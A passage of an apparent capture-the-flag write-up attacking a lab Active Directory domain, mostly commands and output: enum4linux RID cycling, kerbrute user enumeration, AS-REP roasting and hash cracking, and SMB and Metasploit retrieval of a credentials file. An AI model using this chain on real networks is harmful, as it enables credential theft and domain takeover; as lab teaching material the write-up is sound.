[+] Host is part of a domain (not a workgroup)

 ========================================= 
|    OS information on spookysec.local    |
 ========================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for spookysec.local from smbclient: 
[+] Got OS info for spookysec.local from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ================================ 
|    Users on spookysec.local    |
 ================================ 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ============================================ 
|    Share Enumeration on spookysec.local    |
 ============================================ 

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on spookysec.local

 ======================================================= 
|    Password Policy Information for spookysec.local    |
 ======================================================= 
[E] Unexpected error from polenum:


[+] Attaching to spookysec.local using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:SPOOKYSEC.LOCAL)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.


[E] Failed to get password policy with rpcclient


 ================================= 
|    Groups on spookysec.local    |
 ================================= 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================== 
|    Users on spookysec.local via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================== 
[I] Found new SID: S-1-5-21-3591857110-2884097990-301047963
[I] Found new SID: S-1-5-21-3532885019-1334016158-1514108833
[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-502 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-505 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-506 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-507 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-508 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-509 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-510 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-511 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-512 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)
S-1-5-21-3532885019-1334016158-1514108833-514 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-515 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-516 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-517 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-518 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-519 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-520 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-521 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-522 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-523 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-524 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-525 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-526 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-527 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-528 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-529 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-530 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-531 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-532 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-533 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-534 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-535 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-536 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-537 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-538 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-539 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-540 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-541 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-542 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-543 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-544 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-545 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-546 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-547 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-548 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-549 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-550 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1000 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1001 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1002 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1003 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1004 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1005 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1006 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1007 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1008 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1009 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1010 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1011 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1012 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1013 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1014 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1015 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1016 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1017 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1018 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1019 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1020 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1021 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1022 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1023 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1024 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1025 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1026 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1027 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1028 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1029 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1030 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1031 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1032 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1033 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1034 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1035 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1036 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1037 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1038 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1039 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1040 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1041 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1042 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1043 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1044 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1045 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1046 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1047 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1048 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1049 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-503 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-504 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-505 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-506 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-507 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-508 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-509 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-510 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-511 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-523 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-524 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-528 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-529 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-530 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-531 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-532 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-533 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-534 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-535 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-536 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-537 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-538 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-539 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-540 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-541 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-542 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-543 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-544 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-545 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-546 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-547 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-548 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-549 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-550 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)
S-1-5-21-3591857110-2884097990-301047963-1001 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1002 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1003 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1004 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1005 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1006 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1007 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1008 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1009 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1010 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1011 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1012 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1013 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1014 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1015 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1016 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1017 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1018 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1019 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1020 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1021 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1022 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1023 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1024 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1025 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1026 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1027 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1028 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1029 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1030 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1031 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1032 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1033 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1034 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1035 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1036 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1037 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1038 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1039 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1040 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1041 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1042 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1043 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1044 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1045 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1046 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1047 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1048 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1049 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1050 *unknown*\*unknown* (8)

 ================================================ 
|    Getting printer info for spookysec.local    |
 ================================================ 
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Fri Apr 17 13:16:10 2020

root@kali:~# &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We gathered a lot of data that gave us more idea about the targeted AD since our tool failed to gain any credentials or usernames we will do that the hard way {Bruteforcing}, the next tool we'll be using is very powerful created by &lt;strong&gt;Ronnie Flathers&lt;/strong&gt;, I would suggest checking the details about the tool on github, I'll leave the link at the end.&lt;/p&gt;&lt;blockquote&gt;Let's get some usernames!&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/17/20 - Ronnie Flathers @ropnop

2020/04/17 13:17:24 &amp;gt;  Using KDC(s):
2020/04/17 13:17:24 &amp;gt;   spookysec.local:88

2020/04/17 13:17:24 &amp;gt;  [+] VALID USERNAME:       james@spookysec.local
2020/04/17 13:17:24 &amp;gt;  [+] VALID USERNAME:       svc-admin@spookysec.local
2020/04/17 13:17:24 &amp;gt;  [+] VALID USERNAME:       James@spookysec.local
2020/04/17 13:17:24 &amp;gt;  [+] VALID USERNAME:       robin@spookysec.local
2020/04/17 13:17:24 &amp;gt;  [+] VALID USERNAME:       darkstar@spookysec.local
2020/04/17 13:17:24 &amp;gt;  [+] VALID USERNAME:       administrator@spookysec.local
2020/04/17 13:17:24 &amp;gt;  [+] VALID USERNAME:       backup@spookysec.local
2020/04/17 13:17:24 &amp;gt;  [+] VALID USERNAME:       paradox@spookysec.local
2020/04/17 13:17:25 &amp;gt;  [+] VALID USERNAME:       JAMES@spookysec.local
2020/04/17 13:17:25 &amp;gt;  [+] VALID USERNAME:       Robin@spookysec.local
2020/04/17 13:17:27 &amp;gt;  [+] VALID USERNAME:       Administrator@spookysec.local
2020/04/17 13:17:29 &amp;gt;  [+] VALID USERNAME:       Darkstar@spookysec.local
2020/04/17 13:17:30 &amp;gt;  [+] VALID USERNAME:       Paradox@spookysec.local
2020/04/17 13:17:33 &amp;gt;  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2020/04/17 13:17:34 &amp;gt;  [+] VALID USERNAME:       ori@spookysec.local
2020/04/17 13:17:35 &amp;gt;  [+] VALID USERNAME:       ROBIN@spookysec.local
2020/04/17 13:17:44 &amp;gt;  Done! Tested 100000 usernames (16 valid) in 20.383 seconds
root@kali:~# &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The next step we will use GetNPUsers.py from Impacket to retrieve kerberos ticket and try to decrypt it.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# find / -type f -name 'GetNPUsers.py'
/usr/share/doc/python3-impacket/examples/GetNPUsers.py
root@kali:~# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx03300355dc7659423fe0e31a657e0b4c0b7e5b01803004807927ddaa362d14f16fa0f994cdafa7c6bae1ad9ffe50b362391fb16760cfa776f25a9c3b9edbd9784e68275d1d7e39d83688a78653c58d41622695800187dbbc87dd923e1e7eaf70a6a25bb0eabee8656ee3873d5be19e6e2b5a6f858a761a66b385f606d7fbb3e557d222d991fbd3a0fec7ce29db064500576c48881a9f4793259f3fbb8c79bd3dc8de6cd92fe64d30ea6e9e299d5335f115e201c1d9d7f7ec81c5d5663b926ee17c61ac742247762eca95393af92a57b07dbfcf5e8b5d45b1058d4ca2ac879556025d3247630cc43c033b7f672c8fe
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# john kerbhash --wordlist=/root/passwordlist.txt 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mxxxxxxxxxxxxx   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)
1g 0:00:00:00 DONE (2020-04-17 13:20) 33.33g/s 221866p/s 221866c/s 221866C/s horoscope..amy123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;The password list and users are available in the challenge room&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;after getting the credentials of svc-admin, we'll move on checking the shared file with the user and look for anything that we can use, listing the files show us a backup file, that backup file after downloading it will contain an encoded base64, decoding it will give us back another user credentials.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# smbmap -H spookysec.local -d spookysec.local -u svc-admin -p mxxxxxxxxxxxxx
[+] Finding open SMB ports....
[+] User SMB session established on spookysec.local...
[+] IP: spookysec.local:445     Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        .                                                  
        dr--r--r--                0 Sat Apr  4 19:08:39 2020    .
        dr--r--r--                0 Sat Apr  4 19:08:39 2020    ..
        fr--r--r--               48 Sat Apr  4 19:08:53 2020    backup_credentials.txt
        backup                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        .                                                  
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    InitShutdown
        fr--r--r--                4 Mon Jan  1 00:00:00 1601    lsass
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    ntsvcs
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    scerpc
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-3e8-0
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    epmapper
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-290-0
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    LSM_API_service
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    eventlog
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-428-0
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    TermSrv_API_service
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    Ctx_WinStation_API_service
        fr--r--r--                4 Mon Jan  1 00:00:00 1601    wkssvc
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-30c-0
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-30c-1
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    SessEnvPublicRpc
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    atsvc
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-3b8-0
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-710-0
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    RpcProxy\49671
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    72bba0c63ba338fa
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    RpcProxy\593
        fr--r--r--                4 Mon Jan  1 00:00:00 1601    srvsvc
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    spoolss
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-880-0
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    netdfs
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    W32TIME_ALT
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-2fc-0
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-9d8-0
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-97c-0
        IPC$                                                    READ ONLY       Remote IPC
        .                                                  
        dr--r--r--                0 Sat Apr  4 18:39:35 2020    .
        dr--r--r--                0 Sat Apr  4 18:39:35 2020    ..
        NETLOGON                                                READ ONLY       Logon server share 
        .                                                  
        dr--r--r--                0 Sat Apr  4 18:39:35 2020    .
        dr--r--r--                0 Sat Apr  4 18:39:35 2020    ..
        dr--r--r--                0 Sat Apr  4 18:39:35 2020    spookysec.local
        SYSVOL                                                  READ ONLY       Logon server share 
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;msf5 auxiliary(admin/smb/download_file) &amp;gt; show options 

Module options (auxiliary/admin/smb/download_file):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   FILE_RPATHS                   no        A file containing a list remote files relative to the share to operate on
   RHOSTS       spookysec.local  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
   RPATH        backup_credentials.txt       no        The name of the remote file relative to the share to operate on
   RPORT        445              yes       The SMB service port (TCP)
   SMBDomain    spookysec.local  no        The Windows domain to use for authentication
   SMBPass      mxxxxxxxxxxxxx   no        The password for the specified username
   SMBSHARE     backup           yes       The name of a share on the RHOST
   SMBUser      svc-admin        no        The username to authenticate as
   THREADS      1                yes       The number of concurrent threads (max one per host)

msf5 auxiliary(admin/smb/download_file) &amp;gt; run

[+] 10.10.237.175:445     - backup_credentials.txt saved as: /root/.msf4/loot/20200417133840_default_10.10.237.175_smb.shares.file_838056.txt
[*] spookysec.local:445   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(admin/smb/download_file) &amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;with the password of backup user we can dump domain controller users hashes&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/screenshot.png" class="kg-image" alt="Attacktive Directory | THM write-up"&gt;&lt;/figure&gt;&lt;p&gt;the next step we can either decrypt the NTLM hash and connect to Administrator, or use the beautiful piece of code evil-winrm, feel free to check the Github repository and read more about how the tool works, Links at the end of the article.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# git clone https://github.com/Hackplayers/evil-winrm.git
Cloning into 'evil-winrm'...
remote: Enumerating objects: 72, done.
remote: Counting objects: 100% (72/72), done.
remote: Compressing objects: 100% (58/58), done.
remote: Total 772 (delta 38), reused 32 (delta 14), pack-reused 700
Receiving objects: 100% (772/772), 1.92 MiB | 1.87 MiB/s, done.
Resolving deltas: 100% (443/443), done.
root@kali:~# gem install evil-winrm
Fetching: builder-3.2.4.gem (100%)
Successfully installed builder-3.2.4
Fetching: erubi-1.9.0.gem (100%)
Successfully installed erubi-1.9.0
Fetching: gssapi-1.3.0.gem (100%)
Successfully installed gssapi-1.3.0
Fetching: gyoku-1.3.1.gem (100%)
Successfully installed gyoku-1.3.1
Fetching: httpclient-2.8.3.gem (100%)
